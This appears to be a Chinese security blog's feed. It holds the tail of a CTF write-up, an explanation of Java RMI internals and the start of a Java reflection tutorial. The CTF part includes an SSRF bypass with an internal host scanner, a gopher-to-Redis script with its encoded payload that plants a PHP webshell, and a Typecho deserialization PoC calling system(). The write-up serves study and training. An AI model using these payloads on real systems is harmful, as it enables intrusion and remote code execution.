&lt;p&gt;尝试使用 file 读文件 file 协议被过滤了，尝试通过 file:/ 或者 file: // 去绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051641155.png&#34; alt=&#34;image-20230405164131078&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
function curl($url)&amp;#123;  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
&amp;#125;

if(isset($_GET[&#39;submit&#39;]))&amp;#123;
		$url = $_GET[&#39;url&#39;];
		//echo $url.&amp;quot;\n&amp;quot;;
		if(preg_match(&#39;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#39;, $url,$match))
		&amp;#123;
			//var_dump($match);
			die(&#39;别这样&#39;);
		&amp;#125;
		curl($url);
&amp;#125;
if(isset($_GET[&#39;secret&#39;]))&amp;#123;
	system(&#39;ifconfig&#39;);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;过滤了 file://、dict、127.0.0.1、localhost，还能使用 gopher 协议和 http 协议&lt;/p&gt;
&lt;p&gt;先使用 http 服务探测存活主机，这里用 burp 的探测会卡住，简单的用 python 判断&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
import time

url = &amp;quot;http://d3edfd3a-f06a-42ad-9bf4-fb994618272a.node4.buuoj.cn:81/index.php&amp;quot;
for i in range(255):
	getdata = &amp;quot;?url=http://10.244.80.&amp;quot;+str(i)+&amp;quot;&amp;amp;submit=%E6%8F%90%E4%BA%A4&amp;quot;
	urs_l = url + getdata
	# print(urs_l)
	try:
		re = requests.get(urs_l,timeout=1)
		print(re)
	except requests.exceptions.RequestException:
		print(&amp;quot;失败   &amp;quot;+str(i))
		pass

	time.sleep(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720575.png&#34; alt=&#34;image-20230405172033524&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720183.png&#34; alt=&#34;image-20230405172015095&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着扫描端口，6379 端口是开放的，有 redis 服务，gopher 打 ssrf，redis 的未授权访问漏洞，这里贴一下网上找到的 python2 的脚本这里改一下用 python3 跑&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# 导入 quote 函数
from urllib.parse import quote

# 定义协议、IP、端口、要写入的 PHP 代码、文件名、路径、密码、命令列表
protocol = &amp;quot;gopher://&amp;quot;
ip = &amp;quot;10.244.80.203&amp;quot;
port = &amp;quot;6379&amp;quot;
shell = &amp;quot;\n\n&amp;lt;?php system(\&amp;quot;cat /flag\&amp;quot;);?&amp;gt;\n\n&amp;quot;
filename = &amp;quot;1.php&amp;quot;
path = &amp;quot;/var/www/html&amp;quot;
passwd = &amp;quot;&amp;quot;
cmd = [&amp;quot;flushall&amp;quot;,  # 清空 Redis 数据库
       &amp;quot;set 1 &amp;#123;&amp;#125;&amp;quot;.format(shell.replace(&amp;quot; &amp;quot;, &amp;quot;$&amp;#123;IFS&amp;#125;&amp;quot;)),  # 将 PHP 代码写入 Redis 中
       &amp;quot;config set dir &amp;#123;&amp;#125;&amp;quot;.format(path),  # 设置 Redis 工作目录
       &amp;quot;config set dbfilename &amp;#123;&amp;#125;&amp;quot;.format(filename),  # 设置 Redis 数据库文件名
       &amp;quot;save&amp;quot;  # 将 Redis 数据库保存到磁盘中
       ]

# 如果设置了密码，将 AUTH 命令添加到命令列表中
if passwd:
    cmd.insert(0, &amp;quot;AUTH &amp;#123;&amp;#125;&amp;quot;.format(passwd))

# 拼接 payload
payload = protocol + ip + &amp;quot;:&amp;quot; + port + &amp;quot;/_&amp;quot;

# 定义 redis_format 函数，将命令转换为 Redis 格式
def redis_format(arr):
    CRLF = &amp;quot;\r\n&amp;quot;
    redis_arr = arr.split(&amp;quot; &amp;quot;)
    cmd = &amp;quot;&amp;quot;
    cmd += &amp;quot;*&amp;quot; + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + &amp;quot;$&amp;quot; + str(len((x.replace(&amp;quot;$&amp;#123;IFS&amp;#125;&amp;quot;, &amp;quot; &amp;quot;)))) + CRLF + x.replace(&amp;quot;$&amp;#123;IFS&amp;#125;&amp;quot;, &amp;quot; &amp;quot;)
    cmd += CRLF
    return cmd

# 将每个命令转换为 Redis 格式，并拼接到 payload 中
if __name__ == &amp;quot;__main__&amp;quot;:
    for x in cmd:
        payload += quote(redis_format(x))
    print(payload)
#gopher://10.244.80.203:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0A1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问木马文件就能拿到 flag&lt;/p&gt;
&lt;h3 id=&#34;ez三剑客-eztypecho&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ez三剑客-eztypecho&#34;&gt;#&lt;/a&gt; EZ 三剑客 - EzTypecho&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051750723.png&#34; alt=&#34;image-20230405175019643&#34; /&gt;&lt;/p&gt;
&lt;p&gt;直接去找 Typecho 的 cve，看到是有反序列化漏洞的&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQyNC8jMHgwMQ==&#34;&gt; Typecho 前台 getshell 漏洞分析 (seebug.org)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这个直接用网上的 poc 打就行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class Typecho_Request
&amp;#123;
    private $_params = array();
    private $_filter = array();

    public function __construct()
    &amp;#123;
        $this-&amp;gt;_params[&#39;screenName&#39;] = &#39;ls /&#39;;
        //$this-&amp;gt;_params[&#39;screenName&#39;] = -1;
        $this-&amp;gt;_filter[0] = &#39;system&#39;;
    &amp;#125;
&amp;#125;

class Typecho_Feed
&amp;#123;
    const RSS2 = &#39;RSS 2.0&#39;;
    /** 定义ATOM 1.0类型 */
    const ATOM1 = &#39;ATOM 1.0&#39;;
    /** 定义RSS时间格式 */
    const DATE_RFC822 = &#39;r&#39;;
    /** 定义ATOM时间格式 */
    const DATE_W3CDTF = &#39;c&#39;;
    /** 定义行结束符 */
    const EOL = &amp;quot;\n&amp;quot;;
    private $_type;
    private $_items = array();
    public $dateFormat;

    public function __construct()
    &amp;#123;
        $this-&amp;gt;_type = self::RSS2;
        $item[&#39;link&#39;] = &#39;1&#39;;
        $item[&#39;title&#39;] = &#39;2&#39;;
        $item[&#39;date&#39;] = 1507720298;
        $item[&#39;author&#39;] = new Typecho_Request();
        $item[&#39;category&#39;] = array(new Typecho_Request());

        $this-&amp;gt;_items[0] = $item;
    &amp;#125;
&amp;#125;

$x = new Typecho_Feed();
$a = array(
    &#39;host&#39; =&amp;gt; &#39;localhost&#39;,
    &#39;user&#39; =&amp;gt; &#39;xxxxxx&#39;,
    &#39;charset&#39; =&amp;gt; &#39;utf8&#39;,
    &#39;port&#39; =&amp;gt; &#39;3306&#39;,
    &#39;database&#39; =&amp;gt; &#39;typecho&#39;,
    &#39;adapter&#39; =&amp;gt; $x,
    &#39;prefix&#39; =&amp;gt; &#39;typecho_&#39;
);
echo urlencode(base64_encode(serialize($a)));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/</guid>
            <title>RMI浅记</title>
            <link>https://blog.xcu.icu/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/</link>
            <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
            <category term="RMI" scheme="https://blog.xcu.icu/tags/RMI/" />
            <pubDate>Sat, 01 Apr 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;RMI (Remote Method Invocation) 远程方法调，是一种调用远程位置的对象来执行方法的思想，该模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。实际上就是在一个 java 虚拟机上调用另一个 java 虚拟机的对象上的方法  &lt;code&gt;RMI传输数据序列化后的数据&lt;/code&gt; ，下图是 RMI 的架构在后面会详细的介绍到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070018728.png&#34; alt=&#34;image-20230407001809673&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rmi流程代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi流程代码&#34;&gt;#&lt;/a&gt; RMI 流程（代码）&lt;/h2&gt;
&lt;p&gt;这里是参考 su18 师傅的文章通过分析源码来了解这个 RMI&lt;/p&gt;
&lt;p&gt;首先定义一个能够远程调用的接口，这个接口需要继承 Remote 接口，用来远程调用的对象作为这个接口的实例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_RMI_code;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteHelloWorld extends Remote&amp;#123;
    public String hello() throws RemoteException;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接着实现这个接口，这里继承这个接口的同时通常需要扩展 java.rmi.server.UnicastRemoteObject 类，扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时还提供了一些基础的 toString 方法，在 export 时会随机绑定一个端口，监听客户端的请求，直接请求这个端口也可以通行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_RMI_code;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &amp;#123;
    protected RemoteHelloWorld() throws RemoteException &amp;#123;
        super();
    &amp;#125;
    public String hello() throws RemoteException &amp;#123;
        System.out.println(&amp;quot;访问成功&amp;quot;);
        return &amp;quot;Hello world&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面这个实现接口的类实际上就是能被远程调用的对象，对于调用方法 RMI 设计了一个 Registry 的思想，类似路由表的概念，实现这个主要通过 java.rmi.registry.Registry 和 java.rmi.Naming 来实现&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;是 Java 远程方法调用（RMI）中的一个接口，提供了一个远程对象注册表。它用于将远程对象与名称绑定，然后可以使用该名称从远程客户端查找该对象。 &lt;code&gt;Registry&lt;/code&gt;  接口定义了绑定（bind）、解绑（unbind）、列表（list）和查找（lookup）远程对象在注册表中的方法。&lt;/li&gt;
&lt;li&gt;是 Java 远程方法调用（RMI）中的一个类，提供了一个命名服务，用于在远程服务器上绑定和查找远程对象。它可以将一个远程对象绑定到一个 URL 地址上，这个 URL 地址可以被客户端用来查找该远程对象。&lt;br /&gt;
这是一个 final 方法，url 的格式 //host:post/name:
&lt;ol&gt;
&lt;li&gt;host，表示注册表所在的主机&lt;/li&gt;
&lt;li&gt;port 表示注册表接受调用的端口号，默认的是 1099&lt;/li&gt;
&lt;li&gt;name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键词&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用  &lt;code&gt;LocateRegistry#createRegistry()&lt;/code&gt;  方法来创建注册中心，将其加入到呆调用的类中进行绑定&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_RMI_code;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RemoteServer &amp;#123;
    public static void main(String[] args) throws Exception &amp;#123;
        LocateRegistry.createRegistry(1099);
        //创建注册中心
        IRemoteHelloWorld iRemoteHelloWorld = new RemoteHelloWorld();
        //创建远程对象
        Naming.bind(&amp;quot;rmi://127.0.0.1/Hello&amp;quot;,iRemoteHelloWorld);
        //绑定
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后就是在客户端进行调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_RMI_code;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;

public class RMIClient &amp;#123;
    public static void main(String[] args) throws Exception, RemoteException, NotBoundException &amp;#123;
        // 获取 RMI 注册表，参数为 RMI 服务器的 IP 和端口号
        Registry registry = LocateRegistry.getRegistry(&amp;quot;192.168.32.6&amp;quot;,1099);
        // 打印出 RMI 注册表中所有已注册的服务名
//        System.out.println(Arrays.toString(registry.list()));
        // 根据服务名在 RMI 注册表中查找远程对象的 stub
        IRemoteHelloWorld stub = (IRemoteHelloWorld) registry.lookup(&amp;quot;Hello&amp;quot;);
        // 调用远程对象的方法并打印结果
        System.out.println(stub.hello());
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 RemoteServer 类中，创建注册中心后去创建了一个远程对象&lt;/p&gt;
&lt;h3 id=&#34;注册中心的创建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册中心的创建&#34;&gt;#&lt;/a&gt; 注册中心的创建&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;LocateRegistry.createRegistry(1099);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里首先跟进代码看到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070154150.png&#34; alt=&#34;image-20230407015432123&#34; /&gt;&lt;/p&gt;
&lt;p&gt;createRegistry 实际上 new 了 RegistryImpl 对象，继续跟进&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070155087.png&#34; alt=&#34;image-20230407015543039&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这段代码是 Java RMI 中  &lt;code&gt;RegistryImpl&lt;/code&gt;  类的构造函数实现，用于创建 RMI 注册表。如果传入的  &lt;code&gt;port&lt;/code&gt;  参数为默认的注册表端口  &lt;code&gt;Registry.REGISTRY_PORT&lt;/code&gt; ，并且存在安全管理器，则授权注册表使用默认端口，并使用  &lt;code&gt;UnicastServerRef&lt;/code&gt;  类导出远程对象，从而创建注册表的  &lt;code&gt;UnicastServerRef&lt;/code&gt;  对象。否则，直接使用  &lt;code&gt;UnicastServerRef&lt;/code&gt;  类导出远程对象，并创建注册表的  &lt;code&gt;UnicastServerRef&lt;/code&gt;  对象。在导出远程对象时，使用  &lt;code&gt;LiveRef&lt;/code&gt;  类来表示远程对象的引用，同时使用  &lt;code&gt;RegistryImpl::registryFilter&lt;/code&gt;  方法来过滤注册表的传输流。&lt;/p&gt;
&lt;h3 id=&#34;远程对象创建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程对象创建&#34;&gt;#&lt;/a&gt; 远程对象创建&lt;/h3&gt;
&lt;p&gt;这个对象是继承了 UnicastRemoteObject，前面也有提到这个类会自动 export 远程，并获取 Stub，Stub 是一个代理类&lt;/p&gt;
&lt;p&gt;首先这里会调用的静态方法 exportObject&lt;/p&gt;
&lt;p&gt;它是 &lt;code&gt;java.rmi.server.RemoteObject&lt;/code&gt;  类中的一个静态方法。它用于导出远程对象并返回一个存根，该存根可用于调用远程对象上的方法。&lt;/p&gt;
&lt;p&gt;该方法有两个参数：要导出的  &lt;code&gt;Remote&lt;/code&gt;  对象和一个  &lt;code&gt;UnicastServerRef&lt;/code&gt;  对象。如果要导出的对象继承了  &lt;code&gt;UnicastRemoteObject&lt;/code&gt;  类，那么该方法将设置它的  &lt;code&gt;ref&lt;/code&gt;  字段。最后，该方法会调用  &lt;code&gt;sref.exportObject(obj, null, false)&lt;/code&gt;  方法导出远程对象，并返回导出的远程对象的存根。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070102824.png&#34; alt=&#34;image-20230407010207778&#34; /&gt;&lt;/p&gt;
&lt;p&gt;对 RemoteHelloWorld 的 exprot 的创建主要是通过 createprot 方法使用 RemoteObjectInvocationHandler 来为我们测试写的 RemoteObject 实现的 RemoteInterface 接口创建动态代理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070133637.png&#34; alt=&#34;image-20230407013315581&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接下来首先看 RemoteObjectInvocationHandler 这个动态代理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070145489.png&#34; alt=&#34;image-20230407014515460&#34; /&gt;&lt;/p&gt;
&lt;p&gt;继承 RemoteObject 实现 InvocationHandler，因此这是一个可序列化的、可使用 RMI 远程传输的动态代理类，对于动态代理我们这里重点看一下 invoke 方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070146035.png&#34; alt=&#34;image-20230407014619996&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在  &lt;code&gt;invoke&lt;/code&gt;  方法中，首先判断传入的  &lt;code&gt;proxy&lt;/code&gt;  参数是否是一个代理类，如果不是，则抛出一个  &lt;code&gt;IllegalArgumentException&lt;/code&gt;  异常。然后，判断传入的  &lt;code&gt;proxy&lt;/code&gt;  参数是否与当前的  &lt;code&gt;InvocationHandler&lt;/code&gt;  对象匹配，如果不匹配，则抛出一个  &lt;code&gt;IllegalArgumentException&lt;/code&gt;  异常。最后，判断要调用的方法是不是  &lt;code&gt;Object&lt;/code&gt;  类中的方法，如果是，则调用  &lt;code&gt;invokeObjectMethod&lt;/code&gt;  方法来处理方法调用，否则调用  &lt;code&gt;invokeRemoteMethod&lt;/code&gt;  方法来处理远程方法调用。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070148473.png&#34; alt=&#34;image-20230407014842429&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在 invokeObjectMethod 中判断要调用的方法是不是  &lt;code&gt;Object&lt;/code&gt;  类中的  &lt;code&gt;equals&lt;/code&gt; 、 &lt;code&gt;hashCode&lt;/code&gt;  或  &lt;code&gt;toString&lt;/code&gt;  方法，如果是，则直接调用  &lt;code&gt;Object&lt;/code&gt;  类中的相应方法，否则抛出一个  &lt;code&gt;UnsupportedOperationException&lt;/code&gt;  异常。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070150296.png&#34; alt=&#34;image-20230407015000249&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在  &lt;code&gt;invokeRemoteMethod&lt;/code&gt;  方法中，会将方法调用序列化成字节流，并通过 JRMP 协议发送给远程对象。远程对象收到方法调用后，会将字节流反序列化成方法调用，并执行该方法，最后将方法的返回值序列化成字节流，通过 JRMP 协议发送给客户端。&lt;/p&gt;
&lt;h3 id=&#34;服务注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务注册&#34;&gt;#&lt;/a&gt; 服务注册&lt;/h3&gt;
&lt;p&gt;实际上就是绑定过程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070200528.png&#34; alt=&#34;image-20230407020030495&#34; /&gt;&lt;/p&gt;
&lt;p&gt;首先调用了 &lt;code&gt;parseURL&lt;/code&gt;  方法来解析 &lt;code&gt;name&lt;/code&gt;  参数，然后通过 &lt;code&gt;getRegistry&lt;/code&gt;  方法获取了一个 &lt;code&gt;Registry&lt;/code&gt;  对象。接下来，如果 &lt;code&gt;obj&lt;/code&gt;  参数为 &lt;code&gt;null&lt;/code&gt; ，则会抛出 &lt;code&gt;NullPointerException&lt;/code&gt;  异常。最后，使用 &lt;code&gt;registry.bind(parsed.name, obj)&lt;/code&gt;  方法将 &lt;code&gt;obj&lt;/code&gt;  对象绑定到命名服务中。&lt;/p&gt;
&lt;p&gt;这样一个流程来 javasec 上面总结的很详细&lt;/p&gt;
&lt;p&gt;RMI 底层通讯采用了 Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;RMI 客户端在调用远程方法时会先创建 Stub (  &lt;code&gt;sun.rmi.registry.RegistryImpl_Stub&lt;/code&gt;  )。&lt;/li&gt;
&lt;li&gt;Stub 会将 Remote 对象传递给远程引用层 (  &lt;code&gt;java.rmi.server.RemoteRef&lt;/code&gt;  ) 并创建  &lt;code&gt;java.rmi.server.RemoteCall&lt;/code&gt;  (远程调用) 对象。&lt;/li&gt;
&lt;li&gt;RemoteCall 序列化 RMI 服务名称、Remote 对象。&lt;/li&gt;
&lt;li&gt;RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。&lt;/li&gt;
&lt;li&gt;RMI 服务端的远程引用层 (  &lt;code&gt;sun.rmi.server.UnicastServerRef&lt;/code&gt;  ) 收到请求会请求传递给 Skeleton (  &lt;code&gt;sun.rmi.registry.RegistryImpl_Skel#dispatch&lt;/code&gt;  )。&lt;/li&gt;
&lt;li&gt;Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。&lt;/li&gt;
&lt;li&gt;Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。&lt;/li&gt;
&lt;li&gt;RMI 客户端反序列化服务端结果，获取远程对象的引用。&lt;/li&gt;
&lt;li&gt;RMI 客户端调用远程方法，RMI 服务端反射调用 RMI 服务实现类的对应方法并序列化执行结果返回给客户端。&lt;/li&gt;
&lt;li&gt;RMI 客户端反序列化 RMI 远程方法调用结果。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;rmi流程流量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi流程流量&#34;&gt;#&lt;/a&gt; RMI 流程（流量）&lt;/h2&gt;
&lt;p&gt;这里对 &lt;code&gt;需要注意的是RMI被调用的方法执行在客户端&lt;/code&gt; ，P 牛的 JAVA 漫谈中抓包分析，但是我本地的包有较多的混淆流量流，这里直接用 P 牛的图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303280024784.png&#34; alt=&#34;image-20230328002451679&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个是整个流程&lt;/p&gt;
&lt;p&gt;首先这里有一次 TCP 握手，跟踪这个流&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071034441.png&#34; alt=&#34;image-20230407103458372&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着是一个协议确认，客户端向服务器发送了&lt;em&gt; StreamProtocol&lt;/em&gt; 用于确认服务器是否支持此协议&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071056208.png&#34; alt=&#34;image-20230407105655174&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着是服务端向客户端发送的一个确认包确认 ip 和端口号&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071057648.png&#34; alt=&#34;image-20230407105719590&#34; /&gt;&lt;/p&gt;
&lt;p&gt;客户端发给服务器一个 ip 地址，这个 ip 是客户端的 ip 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071058910.png&#34; alt=&#34;image-20230407105815867&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着发送 call 请求&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071101046.png&#34; alt=&#34;image-20230407110109999&#34; /&gt;&lt;/p&gt;
&lt;p&gt;服务端返回 Returndata 包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071102087.png&#34; alt=&#34;image-20230407110212035&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这段是 java 序列化后的内容，⾸先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据流中的 Call 消息；然后 Registry 返回⼀个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应数据流中的 ReturnData 消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.18.0.1:12137 ，于是再与这个地址建⽴ TCP 连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello ()&lt;/p&gt;
&lt;p&gt;然后是服务端和客户端的 ping 包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071105955.png&#34; alt=&#34;image-20230407110506927&#34; /&gt;&lt;/p&gt;
&lt;p&gt;最后一个输出消息包 DgcAck 指示客户端已接收到服务器返回值中的远程对象&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071106096.png&#34; alt=&#34;image-20230407110619069&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着就断开 tcp 连接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071113942.png&#34; alt=&#34;image-20230407111353918&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/26/java%E5%8F%8D%E5%B0%84/</guid>
            <title>java反射</title>
            <link>https://blog.xcu.icu/2023/03/26/java%E5%8F%8D%E5%B0%84/</link>
            <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
            <category term="java反射" scheme="https://blog.xcu.icu/tags/java%E5%8F%8D%E5%B0%84/" />
            <pubDate>Sun, 26 Mar 2023 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;大佬几年前的文章还是能让我受益匪浅，这里浅记 java 反射的学习，参考了 P 牛的文章&lt;/p&gt;
&lt;h2 id=&#34;java反射forname&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java反射forname&#34;&gt;#&lt;/a&gt; java 反射 (forName)&lt;/h2&gt;
&lt;p&gt;首先看看官方对反射的解释&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.
The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;java 安全从反序列化入手，从反射入门反序列化，反射是大多数语言不可或缺的部分，对象可以通过反射来获取其他的类，类可以通过反射拿到所有的成员方法 ( &lt;code&gt;Methods&lt;/code&gt; )、成员变量 ( &lt;code&gt;Fields&lt;/code&gt; )、构造方法 ( &lt;code&gt;Constructors&lt;/code&gt; )，这里所有就是字面意思上的所有，包括私有类&lt;/p&gt;
&lt;h2 id=&#34;类的加载机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#类的加载机制&#34;&gt;#&lt;/a&gt; 类的加载机制&lt;/h2&gt;
&lt;p&gt;学习 java，不得不学习他的类加载机制，java 是依赖于 JVM 实现的跨平台语言，在运行时需要先编译成 class 文件，在初始化的时候会调用 java.lang.ClassLoader 加载类字节码这里贴一张大佬的图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303252145254.png&#34; alt=&#34;image-20230325214537182&#34; /&gt;&lt;/p&gt;
